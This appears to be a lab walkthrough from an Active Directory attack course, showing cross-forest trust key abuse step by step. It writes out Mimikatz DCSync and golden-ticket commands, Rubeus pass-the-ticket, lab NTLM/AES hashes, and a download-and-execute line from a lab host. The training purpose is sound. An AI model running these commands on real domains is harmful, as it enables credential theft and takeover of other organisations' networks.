# Hands-on 25: Cross Forest Attacks - Trust Keys

- [Hands-on 25: Cross Forest Attacks - Trust Keys](#hands-on-25-cross-forest-attacks---trust-keys)
  - [Tasks](#tasks)
  - [Access eushare on envendor-dc](#access-eushare-on-envendor-dc)
  - [Access euvendor-net using PowerShell Remoting](#access-euvendor-net-using-powershell-remoting)

---

## Tasks

Using the DA access to eu.local: 
- Access `eushare` on `euvendor-dc`
- Access `euvendor-net` using PowerShell Remoting

<br/>

---

## Access eushare on envendor-dc

Recall in [Hands-on 23: Cross Domain Attacks - Constrained Delegation](l23-XForestConstrainedDelegation.md), we have the credential for `eu\administrator`:

Note:
eu\administrator
- SID: S-1-5-21-3657428294-2017276338-1274645009-500
- AES256: 4e7ba210b76d807429e7ad8b210e103528dcf5db8b9de6b411bf593269955a6d
- NTLM: fe422f818eb7e9c6de5862d94739c2e4

<br/>

First use an elevated shell to perform an over-pass-the-hash to become `eu\administrator`:

```
C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /domain:eu.local /user:administrator /aes256:4e7ba210b76d807429e7ad8b210e103528dcf5db8b9de6b411bf593269955a6d /run:powershell.exe" "exit"
```

<br/>

Perform a DCSync in the spawned shell to obtain the forest trust key of `euvendor.local`:

```
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:eu\euvendor$ /domain:eu.local" "exit"
```

![picture 1](images/df4b181241dbbb4c16d44c64d3b42f94a5d6245ffb3482b6407316a5904e7eff.png)  

Note:
eu\euvendor$
- SID: `S-1-5-21-3657428294-2017276338-1274645009-1107`
- NTLM: `6ea61970f39a88a2f8709e9268bc5a4c`
- AES256: `b9111b5f59113d3c5145f5e21aebba41733e1e35678f2e08e203bf77f0819be8`

<br/>

To enumerate the trusts information of `eu.local`, we can use https://gallery.technet.microsoft.com/scriptcenter/Get-Active-Directory-2a9e15d2 on the over-pass-the-hash shell:

(Well this is stupid ... `eu-dc` has AD module off-the-land!)

```
winrs -r:eu-dc.eu.local cmd.exe

powershell -ep bypass

iex ((New-Object Net.WebClient).DownloadString("http://192.168.100.64/Get-ADTrustInfo.ps1"))

Get-ADTrustsInfo -DomainName eu.local
```

![picture 2](images/32222ed6b3ec58b3a125300fa90ebec2ca43e89a73abc9b3e2d34821731b0190.png)  

Note:
euvendor.local
- SID: `S-1-5-21-4066061358-3942393892-617142613`

<br/>

In elevated shell, use the above information to forge an inter-forest TGT:

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

. C:\AD\Tools\Invoke-Mimikatz.ps1

Invoke-Mimikatz -Command '"kerberos::golden /domain:eu.local /user:administrator /sid:S-1-5-21-3657428294-2017276338-1274645009 /aes256:b9111b5f59113d3c5145f5e21aebba41733e1e35678f2e08e203bf77f0819be8 /service:krbtgt /target:euvendor.local /sids:S-1-5-21-4066061358-3942393892-617142613-519 /ticket:C:\AD\Tools\sharedwitheu.kirbi"'
```

![picture 4](images/93bb5cf915e14b403cfd4a9ff34877a1727bff44f47e41f2e7189ac4f92b7b75.png)  


<br/>

Note that `euvendor-dc.euvendor.local` is not reachable by the student machine.

In so, transfer the `kirbi` file and `Rubeus.exe` to the `eu-dc`. 

On local machine:

```
cd C:\AD\Tools; python -m SimpleHTTPServer 80
```

On `eu-dc`:

```
cd C:\Users\Public; wget http://192.168.100.64/sharedwitheu.kirbi -OutFile .\sharedwitheu.kirbi; wget http://192.168.100.64/Rubeus.exe -OutFile .\Rubeus.exe
```

![picture 5](images/c156eaf6ea77da03a3c72555599d56cb10e073630c6f82db4ddeaa12d6dee255.png)  


<br/>

Then on `eu-dc` use **Rubeus.exe** to obtain a TGS and Pass-the-ticket:

```
C:\Users\Public\Rubeus.exe asktgs /ticket:C:\Users\Public\sharedwitheu.kirbi /service:CIFS/euvendor-dc.euvendor.local /dc:euvendor-dc.euvendor.local /ptt
```

![picture 6](images/640a5f7eb454ef9011da41e6ff5f8880813c1c2325201359fe74d7349597b8c5.png)  

However, it turns out to be having bad integrity. This could be due to using `aes256` key.

<br/>

Instead, perform the process in `ec-dc`:

```
wget http://192.168.100.64/BetterSafetykatz.exe -OutFile .\BetterSafetykatz.exe
```

```
C:\Users\Public\BetterSafetykatz.exe "kerberos::golden /domain:eu.local /user:administrator /sid:S-1-5-21-3657428294-2017276338-1274645009 /rc4:6ea61970f39a88a2f8709e9268bc5a4c /service:krbtgt /target:euvendor.local /sids:S-1-5-21-4066061358-3942393892-617142613-519 /ticket:C:\Users\Public\sharedwitheu.kirbi" "exit"
```

![picture 7](images/6d0e4a90135a2cbf8e53e053cc22c7c21c8d3c49973639c10ab7cecc6deed706.png)  


```
C:\Users\Public\Rubeus.exe asktgs /ticket:C:\Users\Public\sharedwitheu.kirbi /service:CIFS/euvendor-dc.euvendor.local /dc:euvendor-dc.euvendor.local /ptt
```

![picture 8](images/ad2848c3db74007c320e88805d16db3cb5b29dc814402abbff3daeac33788cf3.png)  

<br/>

Then try to access `\\euvendor-dc.euvendor.local\eushare`:

```
ls \\euvendor-dc.euvendor.local\eushare

type \\euvendor-dc.euvendor.local\eushare\shared.txt
```

![picture 9](images/cc2844b18bfc094e7197eba98690ba3f0c5557bf345c9826426ead111380fe1a.png)  

<br/>

---

## Access euvendor-net using PowerShell Remoting

Enumerate trusts on `eu-dc`:

```
Get-ADTrust -Filter *
```

![picture 10](images/168fbe5eadabba5b48731eb1a6f45b85c4b12769b3ce56a69ecce2e9d9b38576.png)  

- `SIDFilteringForestAware` = `True` means `SIDHistory` is enabled across the forest trust.

<br/>

Only `RID>1000` SIDs are allowed across the trust boundary - Enterprise Admins for example.

```
Get-ADGroup -Server euvendor.local -Filter * | Select Name, SID
```

![picture 11](images/9f4d32106d5bd0fcc9da8be4f12b6a533f0135302c9b2311e395205193f5522e.png)  

<br/>

We can make use of `EUAdmins` (SID: `S-1-5-21-4066061358-3942393892-617142613-1103`).

Creata a TGT with `SIDHistory` of the group `EUAdmins`:

```
C:\Users\Public\BetterSafetyKatz.exe "kerberos::golden /user:administrator /domain:eu.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /rc4:6ea61970f39a88a2f8709e9268bc5a4c /service:krbtgt /target:euvendor.local /sids:S-1-5-21-4066061358-3942393892-617142613-1103 /ticket:C:\Users\Public\euvendoreuadmin.kirbi" "exit"
```

![picture 12](images/3148dc4f5df302479422c2a0e5bb25d4cad26e4811fb4843660b3efd53357d5c.png)  

<br/>

Then use `Rubeus.exe` to ptt:

```
C:\Users\Public\Rubeus.exe asktgs /ticket:C:\Users\Public\euvendoreuadmin.kirbi /service:HTTP/euvendor-net.euvendor.local,HOST/euvendor-net.euvendor.local /dc:euvendor-dc.euvendor.local /ptt
```

![picture 13](images/55e82334c5dda12b0b4d0fdb58629187e9e9a909f42602c155f1a41a348c9368.png)  

<br/>

Enumerate computers in `euvendor.local`:

```
Get-ADComputer -Filter * -Server euvendor.local | Select name
```

![picture 14](images/ecc4d0f39c833c856518608275d77d30127cf6c9d2e016fa37210f7210ac1f22.png)  

```
Invoke-Command -Scriptblock {hostname; whoami} -ComputerName euvendor-net.euvendor.local -Authentication NegotiateWithImplicitCredential
```

![picture 15](images/032f69407eb3bf2af05a62e69ad4acba6338ac4998b84fd8596302000dd240f2.png)  


<br/>


Try to get a powershell session on `euvendor-net`:

```
winrs -r:euvendor-net.euvendor.local powershell.exe
```

![picture 16](images/ff4ae45ff66cf0a67be61f83b9aaa2977d446fe086933e9860d76784bb1cd7d7.png)  

---